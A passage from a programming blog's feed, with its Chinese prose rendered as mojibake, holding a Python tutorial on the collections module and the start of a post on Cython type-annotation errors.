çš„æ“ä½œçš„åŒå­¦æœ‰æ‰€å¸®åŠ©ï¼Œä¹Ÿå¸Œæœ›å¤§å®¶æå‡ºå®è´µçš„å»ºè®®å’Œæ„è§ã€‚é¡¹ç›®ç›®å‰åªå®Œæˆäº†åˆæ­¥çš„é€»è¾‘åŠŸèƒ½ï¼Œè¿˜éœ€è¦ç»§ç»­è¡¥å……æµ‹è¯•å’Œå½¢å¼éªŒè¯ï¼Œæ¬¢è¿æœ‰å…´è¶£çš„åŒå­¦æäº¤ Pull Requestã€‚</p><h2><span id="can-kao-wen-dang">å‚è€ƒæ–‡æ¡£</span></h2><ul><li><a href="https://docs.sui.io/">https://docs.sui.io/</a></li><li><a href="https://zhuanlan.zhihu.com/p/439236444">https://zhuanlan.zhihu.com/p/439236444</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Sui ç±»ç‹¼ç¾Šæ¸¸æˆé¡¹ç›®å¼€å‘å®è·µ
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>06. collections â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-123/"/>
    <id>https://qiwihui.com/qiwihui-blog-123/</id>
    <published>2022-08-13T01:54:25.710Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>Python ä¸­çš„ <code>collections</code> æ¨¡å—å®ç°äº†ä¸“é—¨çš„å®¹å™¨æ•°æ®ç±»å‹ï¼Œæä¾›äº† Python é€šç”¨å†…ç½®å®¹å™¨dictï¼Œlistï¼Œsetå’Œtupleçš„æ›¿ä»£æ–¹æ¡ˆã€‚</p><p>åŒ…å«ä»¥ä¸‹å·¥å…·ï¼š</p><ul><li><code>namedtuple</code>ï¼šç”¨äºåˆ›å»ºå…·æœ‰å‘½åå­—æ®µçš„å…ƒç»„å­ç±»çš„å·¥å‚å‡½æ•°</li><li><code>OrderedDict</code>ï¼šç”¨äºè®°ä½æ¡ç›®æ·»åŠ é¡ºåºçš„dictå­ç±»</li><li><code>Counter</code>ï¼šç”¨äºè®¡ç®—å¯å“ˆå¸Œå¯¹è±¡çš„dictå­ç±»</li><li><code>defaultdict</code>ï¼šè°ƒç”¨å·¥å‚å‡½æ•°ä»¥æä¾›ç¼ºå¤±å€¼çš„dictå­ç±»</li><li><code>deque</code>ï¼š åˆ—è¡¨å¼å®¹å™¨ï¼Œæ”¯æŒä¸¤ç«¯éƒ½æœ‰å¿«é€Ÿè¿½åŠ å’Œå¼¹å‡º</li></ul><p>åœ¨Python 3ä¸­ï¼Œè¿˜å­˜åœ¨å…¶ä»–ä¸€äº›æ¨¡å—ï¼ˆChainMapï¼ŒUserDictï¼ŒUserListï¼ŒUserStringï¼‰ã€‚ æœ‰å…³æ›´å¤šå‚è€ƒï¼Œè¯·å‚è§ <a href="https://docs.python.org/3/library/collections.html">https://docs.python.org/3/library/collections.html</a>ã€‚</p><span id="more"></span><h3><span id="counter">Counter</span></h3><p>è®¡æ•°å™¨æ˜¯ä¸€ä¸ªå°†å…ƒç´ å­˜å‚¨ä¸ºå­—å…¸é”®çš„å®¹å™¨ï¼Œè€Œå®ƒä»¬çš„è®¡æ•°åˆ™å­˜å‚¨ä¸ºå­—å…¸å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">a = <span class="string">&quot;aaaaabbbbcccdde&quot;</span></span><br><span class="line">my_counter = Counter(a)</span><br><span class="line"><span class="built_in">print</span>(my_counter)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_counter.items())</span><br><span class="line"><span class="built_in">print</span>(my_counter.keys())</span><br><span class="line"><span class="built_in">print</span>(my_counter.values())</span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line">my_counter = Counter(my_list)</span><br><span class="line"><span class="built_in">print</span>(my_counter)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡ºç°æœ€å¤šçš„å…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(my_counter.most_common(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›å…ƒç´ çš„è¿­ä»£å™¨ï¼Œæ¯ä¸ªå…ƒç´ é‡å¤å…¶è®¡æ•°æ¬¡æ•°</span></span><br><span class="line"><span class="comment"># å…ƒç´ è¿”å›é¡ºåºä»»æ„</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(my_counter.elements()))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Counter(&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;e&#x27;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">dict_items([(<span class="string">&#x27;a&#x27;</span>, <span class="number">5</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;d&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">1</span>)])</span><br><span class="line">dict_keys([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>])</span><br><span class="line">dict_values([<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br><span class="line">Counter(&#123;<span class="number">1</span>: <span class="number">4</span>, <span class="number">2</span>: <span class="number">3</span>, <span class="number">0</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">2</span>, <span class="number">4</span>: <span class="number">1</span>&#125;)</span><br><span class="line">[(<span class="number">1</span>, <span class="number">4</span>)]</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><h3><span id="namedtuple">namedtuple</span></h3><p><code>namedtuple</code> æ˜¯å®¹æ˜“åˆ›å»ºï¼Œè½»é‡çº§çš„å¯¹è±¡ç±»å‹ã€‚ å®ƒä»¬ä¸ºå…ƒç»„ä¸­çš„æ¯ä¸ªä½ç½®åˆ†é…å«ä¹‰ï¼Œå¹¶å…è®¸ä½¿ç”¨æ›´å…·å¯è¯»æ€§çš„å¸¦æ–‡æ¡£ä»£ç ã€‚ å®ƒä»¬å¯ä»¥åœ¨ä½¿ç”¨å¸¸è§„å…ƒç»„çš„ä»»ä½•åœ°æ–¹ä½¿ç”¨ï¼Œå¹¶ä¸”å®ƒä»¬å¢åŠ äº†æŒ‰åç§°è€Œä¸æ˜¯ä½ç½®ç´¢å¼•è®¿é—®å­—æ®µçš„èƒ½åŠ›ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªnamedtupleï¼Œå…¶ç±»åç§°ä¸ºstringï¼Œå…¶å­—æ®µä¸ºstring</span></span><br><span class="line"><span class="comment"># ç»™å®šå­—ç¬¦ä¸²ä¸­çš„å­—æ®µå¿…é¡»ç”¨é€—å·æˆ–ç©ºæ ¼åˆ†éš”</span></span><br><span class="line">Point = namedtuple(<span class="string">&#x27;Point&#x27;</span>,<span class="string">&#x27;x, y&#x27;</span>)</span><br><span class="line">pt = Point(<span class="number">1</span>, -<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"><span class="built_in">print</span>(pt._fields)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(pt))</span><br><span class="line"><span class="built_in">print</span>(pt.x, pt.y)</span><br><span class="line"></span><br><span class="line">Person = namedtuple(<span class="string">&#x27;Person&#x27;</span>,<span class="string">&#x27;name, age&#x27;</span>)</span><br><span class="line">friend = Person(name=<span class="string">&#x27;Tom&#x27;</span>, age=<span class="number">25</span>)</span><br><span class="line"><span class="built_in">print</span>(friend.name, friend.age)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Point(x=<span class="number">1</span>, y=-<span class="number">4</span>)</span><br><span class="line">(<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.Point&#x27;</span>&gt;</span><br><span class="line"><span class="number">1</span> -<span class="number">4</span></span><br><span class="line">Tom <span class="number">25</span></span><br></pre></td></tr></table></figure><h3><span id="ordereddict">OrderedDict</span></h3><p>OrderedDict å°±åƒå¸¸è§„dictä¸€æ ·ï¼Œä½†æ˜¯å®ƒä»¬è®°ä½æ¡ç›®æ’å…¥çš„é¡ºåºã€‚ åœ¨ OrderedDict ä¸Šè¿›è¡Œè¿­ä»£æ—¶ï¼Œå°†æŒ‰ç…§æ¡ç›®çš„é”®é¦–æ¬¡æ·»åŠ çš„é¡ºåºè¿”å›é¡¹ã€‚ å¦‚æœæ–°æ¡ç›®è¦†ç›–äº†ç°æœ‰æ¡ç›®ï¼Œåˆ™åŸå§‹æ’å…¥ä½ç½®å°†ä¿æŒä¸å˜ã€‚ æ—¢ç„¶å†…ç½®dictç±»è·å¾—äº†è®°ä½æ’å…¥é¡ºåºçš„èƒ½åŠ›ï¼ˆè‡ªpython 3.7èµ·ï¼‰ï¼Œå®ƒä»¬çš„é‡è¦æ€§å°±å˜å¾—ä¸é‚£ä¹ˆé‡è¦äº†ã€‚ ä½†æ˜¯ä»ç„¶å­˜åœ¨ä¸€äº›å·®å¼‚ï¼Œä¾‹å¦‚ OrderedDict è¢«è®¾è®¡ä¸ºæ“…é•¿é‡æ–°æ’åºæ“ä½œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line">ordinary_dict = &#123;&#125;</span><br><span class="line">ordinary_dict[<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line">ordinary_dict[<span class="string">&#x27;b&#x27;</span>] = <span class="number">2</span></span><br><span class="line">ordinary_dict[<span class="string">&#x27;c&#x27;</span>] = <span class="number">3</span></span><br><span class="line">ordinary_dict[<span class="string">&#x27;d&#x27;</span>] = <span class="number">4</span></span><br><span class="line">ordinary_dict[<span class="string">&#x27;e&#x27;</span>] = <span class="number">5</span></span><br><span class="line"><span class="comment"># åœ¨Python 3.7ä¹‹å‰ï¼Œè¿™ä¸ªå¯èƒ½æ˜¯ä»»æ„é¡ºåº</span></span><br><span class="line"><span class="built_in">print</span>(ordinary_dict)</span><br><span class="line"></span><br><span class="line">ordered_dict = OrderedDict()</span><br><span class="line">ordered_dict[<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line">ordered_dict[<span class="string">&#x27;b&#x27;</span>] = <span class="number">2</span></span><br><span class="line">ordered_dict[<span class="string">&#x27;c&#x27;</span>] = <span class="number">3</span></span><br><span class="line">ordered_dict[<span class="string">&#x27;d&#x27;</span>] = <span class="number">4</span></span><br><span class="line">ordered_dict[<span class="string">&#x27;e&#x27;</span>] = <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(ordered_dict)</span><br><span class="line"><span class="comment"># ä¸æ™®é€šdictå…·æœ‰ç›¸åŒçš„åŠŸèƒ½ï¼Œä½†å§‹ç»ˆæœ‰åº</span></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> ordinary_dict.items():</span><br><span class="line">    <span class="built_in">print</span>(k, v)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;e&#x27;</span>: <span class="number">5</span>&#125;</span><br><span class="line">OrderedDict([(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;d&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">5</span>)])</span><br><span class="line">a <span class="number">1</span></span><br><span class="line">b <span class="number">2</span></span><br><span class="line">c <span class="number">3</span></span><br><span class="line">d <span class="number">4</span></span><br><span class="line">e <span class="number">5</span></span><br></pre></td></tr></table></figure><h3><span id="defaultdict">defaultdict</span></h3><p>defaultdictæ˜¯ä¸€ä¸ªä¸é€šå¸¸çš„dictå®¹å™¨ç›¸ä¼¼çš„å®¹å™¨ï¼Œä½†æ˜¯å”¯ä¸€çš„åŒºåˆ«æ˜¯ï¼Œå¦‚æœå°šæœªè®¾ç½®è¯¥é”®ï¼Œåˆ™defaultdictå°†å…·æœ‰é»˜è®¤å€¼ã€‚ å¦‚æœä¸ä½¿ç”¨defaultdictï¼Œåˆ™ä½ å¿…é¡»æ£€æŸ¥è¯¥é”®æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™å°†å…¶è®¾ç½®ä¸ºæ‰€éœ€çš„é”®ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªé»˜è®¤intå€¼ï¼Œå³ 0</span></span><br><span class="line">d = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">d[<span class="string">&#x27;yellow&#x27;</span>] = <span class="number">1</span></span><br><span class="line">d[<span class="string">&#x27;blue&#x27;</span>] = <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(d.items())</span><br><span class="line"><span class="built_in">print</span>(d[<span class="string">&#x27;green&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªé»˜è®¤åˆ—è¡¨å€¼ï¼Œå³ç©ºåˆ—è¡¨</span></span><br><span class="line">d = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">s = [(<span class="string">&#x27;yellow&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;blue&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;yellow&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;blue&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;red&#x27;</span>, <span class="number">5</span>)]</span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> s:</span><br><span class="line">    d[k].append(v)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d.items())</span><br><span class="line"><span class="built_in">print</span>(d[<span class="string">&#x27;green&#x27;</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict_items([(<span class="string">&#x27;yellow&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;blue&#x27;</span>, <span class="number">2</span>)])</span><br><span class="line"><span class="number">0</span></span><br><span class="line">dict_items([(<span class="string">&#x27;yellow&#x27;</span>, [<span class="number">1</span>, <span class="number">3</span>]), (<span class="string">&#x27;blue&#x27;</span>, [<span class="number">2</span>, <span class="number">4</span>]), (<span class="string">&#x27;red&#x27;</span>, [<span class="number">5</span>])])</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><h3><span id="deque">deque</span></h3><p>dequeæ˜¯åŒç«¯é˜Ÿåˆ—ã€‚ å®ƒå¯ç”¨äºåœ¨ä¸¤ç«¯æ·»åŠ æˆ–åˆ é™¤å…ƒç´ ã€‚ dequeæ”¯æŒä»é˜Ÿåˆ—çš„ä»»ä¸€ä¾§çº¿ç¨‹å®‰å…¨ï¼Œå†…å­˜é«˜æ•ˆåœ°è¿½åŠ å’Œå¼¹å‡ºï¼Œåœ¨ä»»ä¸€æ–¹å‘ä¸Šå¤§è‡´ç›¸åŒçš„ <code>O(1)</code> æ€§èƒ½ã€‚ æ›´å¸¸ç”¨çš„æ ˆå’Œé˜Ÿåˆ—æ˜¯åŒç«¯é˜Ÿåˆ—çš„é€€åŒ–å½¢å¼ï¼Œå…¶ä¸­è¾“å…¥å’Œè¾“å‡ºé™åˆ¶ä¸ºå•ç«¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line">d = deque()</span><br><span class="line"></span><br><span class="line"><span class="comment"># append() : æ·»åŠ å…ƒç´ åˆ°å³ç«¯</span></span><br><span class="line">d.append(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">d.append(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># appendleft() : æ·»åŠ å…ƒç´ åˆ°å·¦ç«¯</span></span><br><span class="line">d.appendleft(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() : è¿”å›å¹¶åˆ é™¤å³ç«¯å…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(d.pop())</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># popleft() : è¿”å›å¹¶åˆ é™¤å·¦ç«¯å…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(d.popleft())</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() : åˆ é™¤æ‰€æœ‰å…ƒç´ </span></span><br><span class="line">d.clear()</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">d = deque([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨å³ç«¯æˆ–è€…å·¦ç«¯æ‰©å±•</span></span><br><span class="line">d.extend([<span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">d.extendleft([<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>]) <span class="comment"># ä¸»è¯­ &#x27;j&#x27; ç°åœ¨åœ¨æœ€å·¦ä¾§ </span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># count(x) : è¿”å›æ‰¾åˆ°çš„å…ƒç´ ä¸ªæ•°</span></span><br><span class="line"><span class="built_in">print</span>(d.count(<span class="string">&#x27;h&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘å³æ—‹è½¬1ä¸ªä½ç½®</span></span><br><span class="line">d.rotate(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">å‘å·¦æ—‹è½¬<span class="number">2</span>ä¸ªä½ç½®</span><br><span class="line">d.rotate(-<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">deque([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">deque([<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">b</span><br><span class="line">deque([<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">c</span><br><span class="line">deque([<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">deque([])</span><br><span class="line">deque([<span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>])</span><br><span class="line"><span class="number">1</span></span><br><span class="line">deque([<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>])</span><br><span class="line">deque([<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;j&#x27;</span>])</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      06. collections â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python å‡½æ•°å˜é‡ç±»å‹æ³¨é‡Šä¼šå¯¼è‡´ç”¨ Cython ç¼–è¯‘åæ‰§è¡Œä¸ç›´æ¥æ‰§è¡Œç»“æœä¸ä¸€è‡´</title>
    <link href="https://qiwihui.com/qiwihui-blog-117/"/>
    <id>https://qiwihui.com/qiwihui-blog-117/</id>
    <published>2022-08-13T01:54:25.700Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å·¥ä½œä¸­é‡åˆ°å…³äºå‡½æ•°ç±»å‹æ³¨é‡Šå¼•èµ·çš„é”™è¯¯ï¼Œç‰¹æ­¤è®°å½•ä¸€ä¸‹ã€‚</p><p>èµ·å› æ˜¯å…¬å¸çš„é¡¹ç›®ä¸ºäº†å®‰å…¨å’Œæ‰§è¡Œé€Ÿåº¦ï¼Œåœ¨å‘å¸ƒæ—¶ä¼šä½¿ç”¨ Cython è½¬ä¸º C è¯­è¨€å¹¶ç¼–è¯‘æˆåŠ¨æ€è¿æ¥åº“è¿›è¡Œè°ƒç”¨ï¼Œä½†æ˜¯æœ‰ä¸ªå‡½æ•°åœ¨ Python æ‰§è¡Œæ—¶æ­£å¸¸ï¼Œä½†æ˜¯åœ¨åŠ¨æ€è¿æ¥åº“ä¸­å´æ‰§è¡Œé”™è¯¯ã€‚</p><span id="more"></span><h2><span id="cuo-wu-fu-xian">é”™è¯¯å¤ç°</span></h2><p>æµ‹è¯•ç”¨ä¾‹ <code>test.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ip_str</span>(<span class="params">ips: <span class="built_in">str</span></span>):</span><br><span class="line">    ips = [x <span class="keyword">for</span> x <span class="keyword">in</span> ips]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ip</span>(<span class="params">ips</span>):</span><br><span class="line">    ips = [x <span class="keyword">for</span> x <span class="keyword">in</span> ips]</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ <code>compile.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">from</span> Cython.Build <span class="keyword">import</span> cythonize</span><br><span class="line"></span><br><span class="line">extensions = [<span class="string">&quot;test.py&quot;</span>,]</span><br><span class="line"></span><br><span class="line">setup(name=<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">      ext_modules=cythonize(extensions)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç¼–è¯‘ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python compile.py build</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¹‹åè¿›å…¥å¯¹åº” so æ–‡ä»¶ç›®å½• <code>build/lib-&#123;å¹³å°æ¶æ„&#125;</code>ï¼Œè¿è¡Œå¯¹æ¯”ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import <span class="built_in">test</span></span><br><span class="line">&gt;&gt;&gt; test.ip(<span class="string">&quot;123&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; test.ip_str(<span class="string">&quot;123&quot;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line 5, <span class="keyword">in</span> test.ip_str</span><br><span class="line">TypeError: Expected str, got list</span><br></pre></td></tr></table></figure><p>ç»è¿‡è°ƒæŸ¥å‘ç°ï¼Œå½“å‡½æ•°å˜é‡åšäº†ç±»å‹æ³¨é‡Šæ—¶ï¼Œä¸èƒ½é‡æ–°èµ‹å€¼ä¸ºå…¶ä»–ç±»å‹ï¼Œå¦åˆ™ä¼šåœ¨ Cython ç¼–è¯‘åæ‰§è¡Œæ—¶æŠ¥é”™ã€‚</p><p>Cython å¯ä»¥åœ¨ç¼–è¯‘æ—¶æ¨æ–­å‡ºéƒ¨åˆ†ç®€å•çš„é”™è¯¯ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ip1</span>():</span><br><span class="line">    ips: <span class="built_in">str</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ips = [<span class="string">&#x27;1&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Error compiling Cython file:</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">def ip1():</span><br><span class="line">    ips: str = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ips = [<span class="string">&#x27;1&#x27;</span>]</span><br><span class="line">         ^</span><br><span class="line">------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">test.py:10:10: Cannot coerce list to <span class="built_in">type</span> <span class="string">&#x27;str object&#x27;</span></span><br></pre></td></tr></table></figure><p>ä½†å¦‚æœä»£ç æ¯”è¾ƒå¤æ‚ï¼Œåˆ™åªèƒ½åœ¨è¿è¡Œæ—¶æ‰ä¼šå‡ºé”™ã€‚æ‰€ä»¥ä¸Šè¿°é”™è¯¯åªèƒ½åœ¨æ‰§è¡Œçš„æ—¶å€™æ‰è¢«æŠ›å‡ºã€‚</p><h2><span id="yuan-yin">åŸå› </span></h2><p>Cython å°† Python è½¬ä¸º C ä»£ç æ¯”è¾ƒåç±»å‹æ³¨é‡Šä¸å¦ä»£ç æ¯”è¾ƒï¼š</p><ul><li><p>æ²¡æœ‰ç±»å‹æ³¨é‡Šï¼š</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* &quot;test.py&quot;:2</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip_str(ips: str):             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Python wrapper */</span></span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pw_4test_1ip_str(PyObject *__pyx_self, PyObject *__pyx_v_ips); <span class="comment">/*proto*/</span></span><br><span class="line"><span class="type">static</span> PyMethodDef __pyx_mdef_4test_1ip_str = &#123;<span class="string">&quot;ip_str&quot;</span>, (PyCFunction)__pyx_pw_4test_1ip_str, METH_O, <span 